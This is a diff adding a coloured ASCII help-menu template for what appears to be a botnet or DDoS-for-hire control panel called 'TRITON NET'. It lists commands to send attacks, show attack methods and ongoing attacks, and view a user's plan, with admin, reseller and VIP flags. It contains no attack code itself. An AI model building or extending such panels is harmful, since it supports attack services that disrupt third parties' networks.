@@ -1,0 +1,22 @@
+name=help
+description=help menu
+admin=false
+reseller=false
+vip=false
+==================== MENU SPLIT DONE ====================
+<<clear()>>
+
+\x1b[97m                          ╔╦╗ ╦═╗ ╦ \x1b[91m╔╦╗ ╔═╗ ╔╗╔
+\x1b[97m                           ║  ╠╦╝ ║ \x1b[91m ║  ║ ║ ║║║
+\x1b[97m                           ╩  ╩╚═ ╩ \x1b[91m ╩  ╚═╝ ╝╚╝
+\x1b[91m                  ╔═════════════════════════════════════════╗
+\x1b[91m                  ║  \x1b[97mATTACK       > SEND A ATTACK           \x1b[91m║
+\x1b[91m                  ║  \x1b[97mMETHODS      > SHOWS THE METHODS       \x1b[91m║
+\x1b[91m                  ║  \x1b[97mBANNERS      > SHOWS ALL THE BANNERS   \x1b[91m║
+\x1b[91m                  ║  \x1b[97mONGOING      > SHOWS ONGOING ATTACKS   \x1b[91m║
+\x1b[91m                  ║  \x1b[97mPASSWD       > CHANGES TRITON NET PASS \x1b[91m║
+\x1b[91m                  ║  \x1b[97mPLAN         > SHOWS YOUR PLAN ON NET  \x1b[91m║
+\x1b[91m                  ║  \x1b[97mCLS          > CLEARS NET SCREEN       \x1b[91m║
+\x1b[91m                  ║  \x1b[97mCTRL+C       > TERMINATE SESSION       \x1b[91m║
+\x1b[91m                  ╚═════════════════════════════════════════╝
+
